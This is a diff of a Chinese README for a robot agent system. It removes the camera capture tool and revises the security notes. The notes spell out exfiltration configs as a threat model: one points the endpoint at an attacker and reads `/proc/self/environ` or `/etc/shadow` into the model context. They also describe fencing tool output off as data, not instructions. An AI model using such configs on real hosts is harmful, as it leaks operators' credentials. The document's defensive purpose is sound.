@@ -24,7 +24,6 @@
 - [配置文件（推荐）](#配置文件推荐)
 - [模型调用（Rust 直连；Lua 协议驱动轨道已删）](#模型调用rust-直连lua-协议驱动轨道已删)
 - [给智能体的工具](#给智能体的工具)
-- [摄像头：capture_image](#摄像头capture_image)
 - [提示词包：绑定机器人身份](#提示词包绑定机器人身份)
 - [审计轨迹：--audit-log](#审计轨迹--audit-log)
 - [录制模式与训练集导出：--record](#录制模式与训练集导出--record)
@@ -154,7 +153,7 @@ Ctrl-C 照常走下段的取消路径。历史跨会话保留在 `$XDG_STATE_HOM
 
 ## 命令行参数
 
-**下面是 C++ 工具后端 `mybot --mcp-backend` 的选项**：脚本目录、摄像头、
+**下面是 C++ 工具后端 `mybot --mcp-backend` 的选项**：脚本目录、
 `--read-var`、危险能力开关与 `--agent-policy` 都给后端，不给 Rust。
 `--task`、`--prompt-file`、`--llm-*`（含 `--llm-config`）、`--session-file`、
 `--resume` 则只给 `mybot-agent`。Rust 选项使用 `--选项 值` 写法，详见其 `--help`。
@@ -175,11 +174,6 @@ Ctrl-C 照常走下段的取消路径。历史跨会话保留在 `$XDG_STATE_HOM
 | `--read-var <变量名>` | 声明一个**可读**硬件变量，**可重复**；注册 `read_variables` 与 `wait_variable` 工具（缺省**不提供**这两个工具）。只有已注册且种类为 `lua`（驱动）或 `daemon`（守护快照）的名字生效——执行器与传感器同属 `kind=lua`，靠种类分不出，故必须由人列名（见「工具」表与安全说明第 12 条） | 不提供（即无回读能力；声明了名字但一个都不可读时也不提供） |
 | `--fs-root <目录>` | **list_dir / read_file 的只读根目录**（Phase 4）；注册这两个只读文件工具（与硬件/shell 无关）。路径沙箱见 `agent_sandbox.hpp`（见「工具」表与安全说明第 13 条） | 不提供（即无这两个工具）；**只能命令行给**，配置文件写 `fs_root` 会被拒绝加载 |
 | `--agent-write-file` | **显式开启** `write_file`（Phase 5）：在 `--fs-root` 根之内创建/覆盖文本文件（先写同目录临时文件再原子落地：新建用 `link`、覆盖用 `rename`；符号链接目标拒绝；已存在须显式 `overwrite:true`；落地权限 0600）。**依赖 `--fs-root`**（只给本开关会在上电前报错退出 2）；须有 policy 且 `require_confirm` 包含 `write_file`（见「工具」表与安全说明第 14 条） | 不提供（即无写文件能力）；**只能命令行给**，配置文件写 `allow_write_file` 会被拒绝加载 |
-| `--camera-var <变量名>` | 承载摄像头驱动的变量名 | `cam0` |
-| `--camera-device <路径>` | 摄像头设备（需支持 MJPEG；驱动只放行 `/dev/videoN`） | `/dev/video0` |
-| `--camera-src <图片>` | 模拟图片来源：不接摄像头也能跑通「拍照 → 进上下文」。**命令行**给的 src 以其所在目录为白名单根；配置文件给的 `camera_src` **不**推导根（见安全说明第 9 条），需配 `--camera-src-dir` 或 `BOT4CJ_CAMERA_SRC_DIR` | — |
-| `--camera-src-dir <目录>` | `capture_image` 模拟图片的白名单根目录（优先级高于推导）。**只能命令行给**，配置文件写 `camera_src_dir` 会被拒绝加载 | — |
-| `--no-camera` | **不**注册 `capture_image`（去掉拍照能力） | 关（默认注册，前提是该变量解析到 Lua 驱动，见安全说明第 5 条） |
 | `--check-config` | **只校验配置并打印摘要后退出 0**：不装载结构脚本、不上电、不发起任何网络请求。配置文件拼错时不必真起一次会话（接了硬件也不必反复上下电）。失败退出 2（判据仍是 `buildAgentConfig` 那一套，不另立）；会**打开但不写入**审计日志文件（顺带验证其可写） | 关（照常进入会话） |
 | `--audit-log <路径>` | 审计轨迹落点（JSON Lines 追加写；`-` = stderr） | 不记录（见「审计轨迹」节） |
 
@@ -240,10 +234,10 @@ BOT4CJ_LLM_CONFIG=/etc/mybot/llm.json ./build/mybot --robot=robots/spider1.sql \
   两端的 `--check-config` 摘要可分别核对实际配置路径，Rust 校验不替代后端能力校验。
 - **显式关闭**：Rust 用 `--llm-config none` 或 `BOT4CJ_LLM_CONFIG=none`；C++ 后端只能用 `BOT4CJ_LLM_CONFIG=none`。环境变量须分别传给对应进程。
   缺省查找依赖各进程的 CWD，同一份命令换台机器可能读到不同配置——CI/守门/复现问题时应显式关掉或显式指定。
-- **字段归属**：Rust 消费模型、提示词、会话、模型重试及上下文预算字段；摄像头、脚本目录、工具超时、能力门控与策略由后端消费。两侧对对方的专属字段都只登记为已知字段、不解析或授权（Rust 对后端专属字段如此；2026-10-01 批次 A 后 C++ 后端对模型侧字段同样只经白名单不解析——模型侧的类型/值域校验是 mybot-agent 的独占职责）；以下能力字段的拒绝规则由后端执行。`audit_log` 两端各自生效。
+- **字段归属**：Rust 消费模型、提示词、会话、模型重试及上下文预算字段；脚本目录、工具超时、能力门控与策略由后端消费。两侧对对方的专属字段都只登记为已知字段、不解析或授权（Rust 对后端专属字段如此；2026-10-01 批次 A 后 C++ 后端对模型侧字段同样只经白名单不解析——模型侧的类型/值域校验是 mybot-agent 的独占职责）；以下能力字段的拒绝规则由后端执行。`audit_log` 两端各自生效。
 - **字段**：`driver` `var` `endpoint` `model` `api_key` `api_key_file` `timeout` `max_tokens`
   `temperature` `top_p` `reasoning_effort` `thinking` `stream` `max_turns` `max_task_seconds` `scripts_dir`
-  `allow_shell` `allow_hot_sql` `allow_write_file` `prompt_files` `camera_var` `camera_device` `camera_src` `camera_src_dir` `allow_camera` `audit_log`
+  `allow_shell` `allow_hot_sql` `allow_write_file` `prompt_files` `audit_log`
   `agent_policy` `read_vars` `fs_root` `session_file` `max_history_bytes` `max_task_tool_result_bytes` `max_task_image_bytes`
   `max_calls_per_round` `max_retries` `retry_backoff_ms` `run_command_timeout_sec`
   `run_command_max_timeout_sec` `action_script_timeout_sec` `history_summary` `max_summary_bytes`。
@@ -260,10 +254,10 @@ BOT4CJ_LLM_CONFIG=/etc/mybot/llm.json ./build/mybot --robot=robots/spider1.sql \
   `--agent-shell` / `--agent-hot-sql` 并通过 policy 校验，配置中的 `false` 不覆盖已给的命令行开关。
   `session_file` 是**只用于写入**的字段：`--resume`（恢复）是输入通道，
   只认命令行给出的路径——配置文件不能授权一次「把文件内容读进模型上下文」，
-  与下面 `camera_src_dir` / `read_vars` 同判据（写它本身不报错，仅不参与恢复）。
-  `camera_src_dir` 与 `read_vars` 则**一律拒绝**（写了就退出 2，无论命令行给不给）：
+  与下面 `read_vars` 同判据（写它本身不报错，仅不参与恢复）。
+  `read_vars` 则**一律拒绝**（写了就退出 2，无论命令行给不给）：
   它们分别决定"能读哪个目录"与"能读哪些硬件变量"，属**放宽读权限**的字段，
-  只能由命令行 `--camera-src-dir` / `--read-var` 提供（理由见第 9、12 条）。
+  只能由命令行 `--read-var` 提供（理由见第 12 条）。
   `fs_root` 同判据（理由见第 13 条）：只能由命令行 `--fs-root` 提供，写进配置文件
   同样一律拒绝加载并退出 2。`allow_write_file` 同判据（理由见第 14 条）：只能由命令行
   `--agent-write-file` 授权，未给该命令行开关时配置文件写 `true` 会拒绝加载并退出 2；
@@ -303,7 +297,7 @@ BOT4CJ_LLM_CONFIG=/etc/mybot/llm.json ./build/mybot --robot=robots/spider1.sql \
   原先走 `std::cout`，污染了这条约定——现已改走 stderr（回显没丢，只是换了流）。
   **D（2026-09-23）**：agent 模式下 `run_action_script` 的执行窗口内，这段回显改为
   回收进该次工具**回执**（随 `tool` 消息进模型上下文，见下「给智能体的工具」），
-  因此窗口内它不进 stderr；窗口外（管道模式、`capture_image` 的 `playQuiet` 路径）
+  因此窗口内它不进 stderr；窗口外（管道模式）
   照旧写 stderr，行为不变。
   残余**如实声明**：Lua 驱动自己 `print()` 的进度行（如 `Relay.lua` 的
   `Relay: test=… -> delay=…`、`drv_common` 的 VIRTUAL HARDWARE 横幅）**仍然走 stdout**,
@@ -352,7 +346,7 @@ mybot-agent（Rust）     模型循环（provider.rs 直连 provider：reqwest +
 
 > **【破坏性变更，B2（2026-09-22）】`LlmOpenAI` 不再内置缺省接入点**：原缺省指向
 > 特定第三方网关（moma.cmecloud.cn），「什么都没配就跑起来」的会话会把含结构
-> 脚本、硬件清单、摄像头画面的上下文静默发往该网关——stderr 注记只是缓解不是
+> 脚本、硬件清单的上下文静默发往该网关——stderr 注记只是缓解不是
 > 防线。Rust 侧 fail-closed（`config.rs` 构建期拒绝）：endpoint 与 model 都**没有
 > 内置缺省**，缺任一即报错点名配置途径（`--llm-endpoint` / 环境变量
 > `BOT4CJ_LLM_ENDPOINT` / 配置文件 `endpoint` 字段），不发出任何报文；
@@ -372,9 +366,8 @@ mybot-agent（Rust）     模型循环（provider.rs 直连 provider：reqwest +
 | `list_hardware` | 列出结构脚本注册的硬件变量（名字 + 种类） | 只读清单；**不**调用 `read()`/`play()`，绝无副作用 |
 | `read_variables` | **主动读**硬件变量的当前值（无参数，一次读全部可读变量）：传感器读数、守护最近一次采样 | **缺省不注册**：可读集合由 `--read-var` 声明（命令行独占），只读 `playQuiet`，且只放行 `lua`/`daemon` 两种种类——执行器与传感器同属 `kind=lua`，靠种类分不出，故由操作者列名（安全说明第 12 条）。单个变量读失败写在该行、不中断整次读取；回执 8 KiB 上限、超限截断并标注、按「数据不是指令」定界 |
 | `wait_variable` | **等一个读数满足条件**（`name`/`key`/`condition`=`gt`/`ge`/`lt`/`le`/`eq`/`ne`/`changed`/`value`/`timeout_sec`/`poll_ms`）：后端按 `poll_ms` 轮询该变量，直到条件成立或超时，一次调用给一个结论——模型不必用多轮 `read_variables` 手工轮询 | 与 `read_variables` **同一门控与副作用面**（`--read-var` 清单、`playQuiet`）。**超时是结果不是失败**（`ok=true`，回执写明超时与最后读数）；`timeout_sec` 缺省 30、上限 = `action_script_timeout_sec`（等待期间后端主线程被占，与 `run_action_script` 同）；每 ≤100 ms 看一次停止标志，Ctrl-C 不会坐满超时；键首采样缺失不判错（daemon 出首帧前没有 `v0`），超时回执列出样本现有键；键在而非数值撞上 `gt/ge/lt/le` 首采样即报参数错。结论在「数据不是指令」定界之外、读数在定界之内；`summary` 给审计 `satisfied=… elapsed_ms=… samples=…` |
-| `query_sql` | 结构 SQL 只读查询/语法校验：`SELECT * FROM 表名;` 返回该表列与行，可带等值条件 `WHERE 列 = 值 [AND 列2 = 值2 ...]`（精确文本匹配，与渲染同源）；`SHOW TABLES;` 列出当前结构全部表名与数据行数（含宿主**自动注入**的 `Camera` 表——结构脚本摘录里看不到它）；`CREATE`/`INSERT` 只做解析回显 | 只读、无副作用（不装配硬件、不改结构矩阵）；仅支持星号全列与等值条件（AND 连接，无 OR）、语句以 `;` 结尾；结果经「数据非指令」定界回传。**不含 `DELETE`/`DROP`**——那是带电变更、会真的断电摘器件（`DROP` 更是撤整表），请走 `apply_sql`（可先用本工具确认 WHERE 会命中哪些行） |
+| `query_sql` | 结构 SQL 只读查询/语法校验：`SELECT * FROM 表名;` 返回该表列与行，可带等值条件 `WHERE 列 = 值 [AND 列2 = 值2 ...]`（精确文本匹配，与渲染同源）；`SHOW TABLES;` 列出当前结构全部表名与数据行数；`CREATE`/`INSERT` 只做解析回显 | 只读、无副作用（不装配硬件、不改结构矩阵）；仅支持星号全列与等值条件（AND 连接，无 OR）、语句以 `;` 结尾；结果经「数据非指令」定界回传。**不含 `DELETE`/`DROP`**——那是带电变更、会真的断电摘器件（`DROP` 更是撤整表），请走 `apply_sql`（可先用本工具确认 WHERE 会命中哪些行） |
 | `apply_sql` | 结构 SQL **带电生效**：`CREATE TABLE` 建新表（装配驱动模块、真机上电、注册变量）、`INSERT INTO` 往既有表追加行、**`DELETE FROM ... [WHERE ...]` 当场逆序断电并摘除匹配行**（无条件写法删全表）、**`DROP TABLE ...` 当场撤下整张表**（行 + 表壳；**不带 `WHERE`**——它是 DDL、作用于整张表）、**`UPDATE ... SET ... [WHERE ...]` 按断电重建改写命中行**（先摘旧件再装新件；无条件写法改全表数据行；与该表其它行级语句不得同批，拆两次调用即可）；同批次的 `Action` 行执行一次即丢弃（瞬态，不注册） | **缺省不注册**，须命令行 `--agent-hot-sql` 显式开启（配置文件的 `allow_hot_sql` 只能关不能开）；表名/列名须为安全标识符、驱动模块须已在模块路径下、`@Daemon` 行的 `chunk` 须为相对路径；校验全部只读，**任一步失败整批回滚**（逆序断电 + 注册表回退），但已下发的物理动作不回退。**`DELETE`/`DROP` 是不可逆的物理断电，没有回滚**：全部校验（含引用完整性）在动第一个器件之前跑完，中途物理失败则如实报「已删 N 个（名单）、M 个未删」；被 `controller`/`trigger`/`$`/`$(...)` 引用着的变量拒绝删除/改写并点名引用方。**`UPDATE` 批次是先删后建**：新件装配失败时已摘旧件不复原，错误点名丢失的变量（按需要的值重新 INSERT 即可恢复）。对照/查询请用 `query_sql` |
-| `capture_image` | **拍一张照片并把画面注入上下文**，多模态模型因而能「看见」环境 | 经 `modules/Camera.lua` 取帧（V4L2 + MJPEG）；`--no-camera` 可关闭；图片走独立通道（见下节）。可请求采集尺寸：`width`/`height`（像素 16..8192，须同时给出，缺省 640x480）——换尺寸重开设备、代价高于同尺寸连拍；设备就近调档时回执报**实际**尺寸；仿真来源不缩放、请求尺寸无效并明说 |
 | `run_command` | 在主机上执行 shell 命令（退出码 + stdout + stderr） | 超时（缺省 10s，上限 60s，超时整进程组 SIGKILL）、单流 64KB 截断、环境变量清洗、继承 fd 全部 CLOEXEC、**回执进模型上下文前遮蔽敏感值**（G1）；**缺省不注册**，须命令行 `--agent-shell` 显式开启（配置文件的 `allow_shell` 只能关不能开，写 `true` 会拒绝加载） |
 | `list_dir` | 列出机器人主机上一个目录下的条目（文件名 + 类型 + 大小；只读、不递归；`path` 缺省为只读根目录本身） | 符号链接条目不列；条目数上限 1000（超限截断并标注）；**缺省不注册**，须命令行 `--fs-root <目录>` 显式开启（配置文件的 `fs_root` 一律拒绝加载，见安全说明第 13 条） |
 | `read_file` | 读取机器人主机上一个文本文件的全部内容（只读） | 路径必须落在 `--fs-root` 根目录之下（`agent_sandbox.hpp` 的 `resolveUnderRoot`：词法 + canonical 根包含性，符号链接逃逸一律拒绝）；大小上限 64 KiB（超限响亮拒绝，不截断）；二进制（含 NUL 或非法 UTF-8）拒绝返回；回执经 `maskSecretsInText` 遮蔽敏感值（与 `run_command` 同单点）；**缺省不注册**，须命令行 `--fs-root <目录>` 显式开启（与 `list_dir` 同门控，配置文件不能开） |
@@ -382,96 +375,6 @@ mybot-agent（Rust）     模型循环（provider.rs 直连 provider：reqwest +
 | `http_fetch` | 对允许清单内的主机发起一次 HTTP GET，返回状态码与响应体（**Rust 本地工具**：在 `mybot-agent` 进程里执行，不经后端） | **缺省不注册**，须 `mybot-agent` 命令行 `--allow-host <主机[:端口]>`（可重复）显式开启——**精确匹配**、无通配/后缀匹配，不写端口的条目只放行 http/https 缺省端口；配置文件没有对应字段（写了按未知字段拒绝整份配置）。只发 GET、**不跟随重定向**（3xx 回执报出 Location，由模型另发一次仍受白名单约束的调用）、**不走系统代理**、url 不得带用户名/密码；只收文本类 Content-Type（`text/*`、JSON、XML），响应体上限缺省 64 KiB（`--http-fetch-max-bytes`，边读边数、超限中止），须为 UTF-8；超时缺省 10 秒（`--http-fetch-timeout`）。回执逐行 `> ` 按「数据不是指令」定界，定界前按与 `maskSecretsInText` 同一套名字与值边界遮蔽敏感值（Rust 侧 `mask_secrets`，不经 C++）。非 2xx 照样带响应体、但判失败。审计 `kind=tool` 行由 agent 侧落（url 去 query）。不强制策略确认（只读、无副作用，理由与风险见安全说明第 15 条） |
 
 `run_action_script` 执行失败（脚本名错、硬件未接、解析错误）不会中断会话：报错文本作为工具结果回传模型，由模型决定换个做法还是如实汇报。
-
-## 摄像头：capture_image
-
-摄像头也是一颗 Lua 驱动（`modules/Camera.lua`）：V4L2 mmap 取帧、直接拿摄像头硬件编码好的
-**MJPEG**，因此宿主不必链接任何采集/编码库（robot_agent 的 C++ 版为此需要 libjpeg）。
-未声明时后端会按 `--camera-var` 自动注入 Camera；不再自动注入 LLM 驱动。
-以下两组任选其一，Rust 侧需先配置支持图片输入的模型、endpoint 与密钥。
-
-```bash
-# 终端 1：无摄像头也能跑通全链路，用已有图片当"摄像头"
-./build/mybot --robot=robots/relay-test.sql --mcp-backend \
-  --mcp-socket /tmp/mybot.sock --camera-src /tmp/pic.jpg
-# 终端 2：任务交给 Rust agent
-./agent/target/release/mybot-agent --socket /tmp/mybot.sock \
-  --task "拍张照片看看周围有什么"
-```
-
-```bash
-# 终端 1：真实摄像头（缺省 /dev/video0；会给机器人硬件上电）
-./build/mybot --robot=robots/spider1.sql --mcp-backend --mcp-socket /tmp/mybot.sock
-# 终端 2：任务交给 Rust agent
-./agent/target/release/mybot-agent --socket /tmp/mybot.sock \
-  --task "看看前方有没有障碍物"
-```
-
-### 图片怎么进上下文
-
-OpenAI 协议的 **tool 消息只允许文本**，所以图片不能塞进工具结果里。Rust 的
-`agent/src/model.rs`（`BudgetModel::inject_images` / `apply_injections`）将后端返回的
-图片加入对应的 rig 工具结果消息末尾，顺序为工具结果、说明文本、图片。
-rig provider 转换为 OpenAI 报文时，先输出本轮全部 `tool` 消息，**再**输出带图的 `user` 消息：
-
-```jsonc
-// OpenAI 线上形态：位于本轮所有 tool 消息之后。
-{ "role": "user", "content": [
-    { "type": "text", "text": "以上工具返回的图片如下，请结合画面内容继续。" },
-    { "type": "image_url", "image_url": { "url": "data:image/jpeg;base64,..." } } ] }
-```
-
-消息组装与 provider 映射现由 Rust/rig 负责，不再调用 C++ `messageToJson`。
-注入顺序及跨轮位置由 `agent/src/model.rs` 中的图片注入单测约束。
-
-> **沿革（B3，2026-09-22 → 2026-09-26 移除）**：旧 C++/Lua 路径曾用 `{"__bot_img": N}`
-> 游标，经 `MtVars_Lua::setHostImages` / `__bot_img(N)` 在组包时落值。agent 循环迁 Rust
-> 后宿主不再组装模型请求，该通道已无生产调用者，故连同 `setHostImages`/`__bot_img`
-> 一并从 luavar 删除；现役图片通道是 capture_image 工具直接把 base64 交给 Rust agent。
-
-图片由 Rust REPL 在任务结束时物化到会话历史里，后续任务仍然看得到它。
-
-data URL 的 MIME 取自**驱动返回的 `format` 字段**（`image/jpeg`、`image/png`、
-`image/gif`、`image/webp`）：驱动按**魔数**判定格式，宿主只做一次「声明与内容
-是否自洽」的交叉校验，不符即拒绝发出（否则会把错标签发给网关，那边只会回一个
-含混的「图片解析错误」）。所以第三方摄像头驱动必须**如实返回 `format`**，
-且只支持这四种；仿真来源（`--camera-src`）不是这四种时驱动会在 `build` 阶段
-就以 `unsupported sim image format` 拒绝。
-
-> **需要多模态模型**。`capture_image` 只负责把画面送到；模型能不能看图取决于你选的
-> 模型/接入点。DeepSeek 的 `deepseek-chat` 不吃图片输入——它可能忽略图片或直接报错，
-> 换一个支持视觉的模型即可（本项目对协议不做假设，两个内置驱动都如实转发图片）。
-
-### 设计要点
-
-- **摄像头是可选外设**：**真机路径下**驱动 `build` 不打开设备、也不返回 ERR，否则一台
-  没接摄像头的机器人会连电都上不了。设备在第一次拍照时按调用参数惰性打开，打不开就如实
-  报给智能体（「无法打开摄像头 /dev/video0（errno=2）…」），模型据此自己决定改做什么。
-  例外：显式给了仿真来源（结构脚本里声明 `src` 元数据列，或 `--camera-src`）时，
-  路径越界 / 文件缺失 / 格式不受支持会**刻意在 `build` 阶段返回 ERR**——拒绝一次注定
-  失败的仿真，比上电后再报错更早、更清楚。agent 模式的自动注入路径不受影响（宿主只在
-  调用时才传 `src`）。
-- **热插拔**：抓拍失败即释放设备，下次调用重试打开；换设备也靠同一句重开。
-- **采集尺寸可请求（2026-09-25 #6）**：`capture_image` 的 `width`/`height`（16..8192，须同给同缺）
-  透传给驱动；与上次请求不同就重开设备重新 `VIDIOC_S_FMT` 协商（起流后不可改格式）。
-  驱动按**请求值**判「是否要重开」而非按协商值——设备常就近调档（请求 300x200 得 320x240），
-  按协商值比对会每次调用都重开。回执报**实际**尺寸；请求与实际不符时说明「被设备就近调档」。
-  仿真来源（`--camera-src`）不缩放图片，此时请求尺寸无效并在回执里明说。尺寸界值只在宿主
-  单点维护（`agentimage.cpp`），Lua 驱动只校验「同给同缺 + 正整数」。
-- **首帧丢弃**：起流后的第一帧曝光/白平衡常常未稳，丢弃后再取一帧（与 robot_agent 同做法）。
-- **截断帧重取**：UVC 设备可能吐出熵编码中途截断的 MJPEG 帧（2026-09-19 实测某设备约半数帧如此；
-  内核不置 `V4L2_BUF_FLAG_ERROR`，宽松解码器照样出图），模型网关的严格解析器却会直接 400
-  「图片输入格式/解析错误」。取帧后按「帧尾 EOI」校验（`lib/mjpeg_frame.lua`；只在帧尾窗口搜索，
-  防 APP1 内嵌缩略图的 EOI 误判），不完整整帧丢弃重取（上限 8 帧），不让坏帧流进模型上下文。
-- **仿真**：`--camera-src <图片>` 直接读文件并 base64 返回，与真机走同一段返回逻辑，
-  因此「拍照 → 进上下文 → 模型看图」这条链路在没有摄像头的开发机上也能完整回归。
-- **路径白名单**：驱动读文件/开设备都受白名单约束——设备只放行 `/dev/videoN`；
-  仿真图片只放行 `--camera-src` 所在目录（或环境变量 `BOT4CJ_CAMERA_SRC_DIR` 列出的
-  目录，冒号分隔）**之内**的文件，判定走 `realpath`，符号链接展开后仍越界即拒。
-  两者都没给时仿真模式默认禁用。这样 `src`/`path` 就不再是「读任意路径」的原语。
-- **ABI 自检**：V4L2 结构尺寸与 ioctl 编号既在驱动加载期 `assert`，又在构建期由
-  `test/test_v4l2_consts.c` 与 `<linux/videodev2.h>` 比对（F-24 同族）——ffi 声明比内核
-  小几字节就是越界读写，必须让它在构建期就失败。
 
 ## 提示词包：绑定机器人身份
 
@@ -507,7 +410,7 @@ data URL 的 MIME 取自**驱动返回的 `format` 字段**（`image/jpeg`、`im
 - **加载时机**：Rust `agent/src/startup.rs::load_prompt_pack` 调用 `prompt.rs`，在连接
   后端之前加载；路径写错、目录里没有 `.md` 等错误退出 2。后端独立运行，可能已上电，
   不能把 Rust 配置失败理解成后端未上电或自动断电。单文件 1 MiB 上限，超限响亮拒绝。
-- **示例包**：`prompts/spider_robot/` 定义蜘蛛机器人的身份、摄像头能力与动作脚本用法、
+- **示例包**：`prompts/spider_robot/` 定义蜘蛛机器人的身份与动作脚本用法、
   动作脚本语义表、行为纪律（前方有障碍不得前进），展示「大模型大脑 + 脚本驱动
   硬件」的完整绑定链路。提示词包是纯 Markdown，照着这个目录结构写你自己的即可。
 
@@ -544,7 +447,7 @@ data URL 的 MIME 取自**驱动返回的 `format` 字段**（`image/jpeg`、`im
   （`env` / `config_inline` / `config_file`），**值绝不出现**。
 
 - **位置在宿主派发漏斗**（`src/agentdispatch.cpp` 的 `DispatchGate::run`）：后端帧协议与 `.mt` 脚本都绕不过；参数解析失败、未知工具、工具异常同样各记一条（「模型想做什么但没做成」也是审计信息）。
-- **图片不进日志**：`capture_image` 只记 `image_bytes` 与 16 位指纹（`image_fp`，FNV-1a 64，非密码学摘要）——否则每次拍照数百 KB 灌进磁盘，且画面可能含隐私。
+- **图片不进日志**：图片类工具只记 `image_bytes` 与 16 位指纹（`image_fp`，FNV-1a 64，非密码学摘要）——否则每次图片注入数百 KB 灌进磁盘，且画面可能含隐私。
 - **密钥遮蔽**：`run_command` 的命令原文记进 `args.command` 前先遮蔽敏感值——`KEY=VALUE`、`Authorization: Bearer <tok>`、裸 `Bearer <tok>`、JSON 引号键 `"name": value`（2026-10-08 补，见下）四种形态的值替换为 `***`；判据与 `run_command` 的环境清洗同源（整词切词，`KEYSTONE`/`MONKEY` 不误伤）。**同一个 `maskSecretsInText` 单点也用于回执**（G1）：命令自己打印到 stdout/stderr 的敏感值，在回传模型前同样被遮蔽；`list_dir`/`read_file`（第 13 条）的文件内容回执同样经这个单点（2026-10-08 补，此前只有 `run_command` 接了，是审计 P1 发现的缺口）。
 - **谁落工具行**：后端工具的 `kind=tool` 行由后端（`mybot --mcp-backend --audit-log`）在派发漏斗里落；
   不经后端的 Rust 本地工具 `http_fetch` 后端看不见，其 `kind=tool` 行由 `mybot-agent` 的 `--audit-log`
@@ -677,7 +580,7 @@ R20c/R20d（段布局与权限、事件时序、图片本体与源图逐字节�
 **恢复（`--resume`，与 `--session-file` 联用）**
 
 - **路径必须来自命令行**：恢复是把磁盘内容读进模型上下文（输入通道），
-  配置文件里的 `session_file` 只用于写入，不能授权一次读取——与 `camera_src_dir` /
+  配置文件里的 `session_file` 只用于写入，不能授权一次读取——与
   `read_vars` 同判据（配置文件只能收紧不能放宽）。文件必须已存在，否则退出 2。
 - **三道判据，全过才恢复**（任一不过即拒绝并说明差异，退出 2）：
   1. **逐行解析**：损坏行**跳过并点名行号**（崩溃留下的残行不该抹掉此前的完整历史），
@@ -1054,9 +957,7 @@ auth 的旧后端会把 auth 帧当 `unknown route` 拒绝（agent 报错并提�
 4. **动作脚本路径是沙箱边界**：`run_action_script` 只接受 `--scripts-dir` 下的 `.mt` 相对路径。这是防误用护栏，
    不是对抗恶意模型的边界——真正的边界仍然是「模型输出即不可信输入」这条工程常识。
 5. **仪表器件不会被工具误触发**：`list_hardware` 不读值（对舵机等执行器，`play({})` 会真的下发指令）。
-   `capture_image` 同样有种类防线：`camera_var` 必须解析到一个 **Lua 驱动**，否则该工具直接不注册并打印提示——
-   `playQuiet` 对别的种类就退化成 `play()`，那样模型调一次「拍照」就会往别名/数值变量/舵机上真下发 `{path,src}`。
-6. **模型调用由 Rust agent 进程出网，不经 Lua 驱动**：`mybot-agent`（reqwest + rustls）直连
+   6. **模型调用由 Rust agent 进程出网，不经 Lua 驱动**：`mybot-agent`（reqwest + rustls）直连
    配置的接入点；C++ 宿主与 Lua 驱动沙箱都不参与网络（2026-09-25 #8 起 Lua 协议驱动轨道已删，
    `modules/Llm*.lua` 不再存在）。威胁模型口径不变：`modules/**/*.lua` 本就是「任意原生代码
    执行入口，信任级等同 mybot 用户」（见 [reference.md](reference.md) 的沙箱威胁模型），
@@ -1073,18 +974,10 @@ auth 的旧后端会把 auth 帧当 `unknown route` 拒绝（agent 报错并提�
    这是**定界与标注，不是过滤器**：能写 `scripts/` 与 `robots/` 的人本就能改这台机器人的一切行为，
    真正的边界仍是第 4 条那条工程常识。提示词包（`prompt_files`）是操作者自己写的，按原样追加、不做引用包裹。
 
-9. **`capture_image` 的模拟图片白名单根不由 `camera_src` 自己推导**（2026-09-21 第七轮审计 H1）：
-   驱动侧的判据是「`realpath(src)` 必须落在 `src_root` 之内」，而 `src_root` 此前是宿主用
-   `canonical(camera_src).parent_path()` 推出来的——**src 的所在目录当然包含 src**，于是判据恒真，
-   白名单形同不存在。可达链条不需要 `--agent-shell`：`allow_camera` 缺省为真、`cam0` 自动注入，
-   一份落在 CWD 的 `./mybot.llm.json`（缺省查找会读它）写 `"camera_src":"/etc/shadow"` 即可把该文件
-   base64 读进模型上下文，再由**同一份配置**可控的 `endpoint` 外发。现在的口径是三条：
-   ① `--camera-src-dir` 显式给的根**优先**；② 没有显式根时，**只有命令行**的 `--camera-src`
-   才用其所在目录当根（操作者自己指的文件，他本就能读，这也保住了「不接摄像头跑通全链路」的快速上手）；
-   ③ 配置文件来源的 `camera_src` **一律不推导**，交由驱动的 `BOT4CJ_CAMERA_SRC_DIR` 判定，
-   两者都没有即默认拒绝（`Camera.lua` 的「仿真图片未放行」文案）。
-   `camera_src_dir` 因此是**命令行独占**字段：它放宽读权限，与 `allow_shell` 同判据
-   （配置文件只能收紧不能放宽），写在配置文件里会被拒绝加载并退出 2。
+9. **文件来源白名单不能由被读文件自身推导**（2026-09-21 第七轮审计 H1）：
+   若某能力允许配置文件指定「读哪个文件」，不能把该文件所在目录当作白名单根（那等于
+   恒真）。此类历史缺陷的现行承载只剩 `prompt_files`，见第 11 条；文件路径判据必须由
+   操作者显式给根，配置文件只能收紧不能放宽。
 
 10. **`apply_sql` 让模型的一次回复直接改变带电的硬件结构**（2026-09-23 热插表）。它比
     `run_command` 更贴近「改这台机器人本身」：新表即 `modules/<表名>.lua` 驱动（表名决定模块
@@ -1121,15 +1014,13 @@ auth 的旧后端会把 auth 帧当 `unknown route` 拒绝（agent 报错并提�
     因此 **`/proc/self/environ` 这类伪文件照样读得到**。合起来是一条不需要任何开关的链路：
     一份落在 CWD 的 `./mybot.llm.json`（缺省查找会读它）写
     `{"endpoint":"<攻击者>","prompt_files":["/proc/self/environ"]}`，就能把操作者的环境块
-    （其中就有宿主重新注入的 `BOT4CJ_LLM_KEY`）整块外发——不需要 `--agent-shell`，也不
-    需要摄像头。这与第 9 条的 `camera_src` 是**同一族**（「配置文件不该授予读权限」），
-    故同判据：
+    （其中就有宿主重新注入的 `BOT4CJ_LLM_KEY`）整块外发——不需要 `--agent-shell`。
+    这与第 9 条是**同一族**（「配置文件不该授予读权限」），故同判据：
     ① **命令行** `--prompt-file` 不受限（操作者自己指的文件，他本就能读，也保住了
     `--prompt-file prompts/spider_robot/` 的快速上手路径）；② **配置文件来源**的每一项
     必须落在当前工作目录，或 `BOT4CJ_PROMPT_DIR`（冒号分隔）显式列出的目录之内，判定走
     `realpath`（`..` 与软链逃逸都拦），越界即在上电前报错退出 2 并点名条目、允许的根与
-    两个出路；③ 环境变量只能由启动者设置，配置文件写不了它——与第 9 条的
-    `BOT4CJ_CAMERA_SRC_DIR` 是同一个逃生口。
+    两个出路；③ 环境变量只能由启动者设置，配置文件写不了它——这是同一个逃生口。
     残余如实声明：这条判据管的是**路径来源**，不是内容——CWD 之内的文件（包括攻击者自己
     放进去的）仍会被原样追加进系统提示词，这属第 8 条已声明的「提示词包按操作者写的原样
     追加」；真正的边界仍是「不要在不信任的目录里启动 mybot」。
@@ -1141,12 +1032,11 @@ auth 的旧后端会把 auth 帧当 `unknown route` 拒绝（agent 报错并提�
     controller）。因此口径是：
     ① 可读集合由命令行 `--read-var <名>`（可重复）声明，**缺省不提供该工具**；
     ② 配置文件写 `read_vars` 会被**拒绝加载并退出 2**（配置只能收紧不能放宽，与
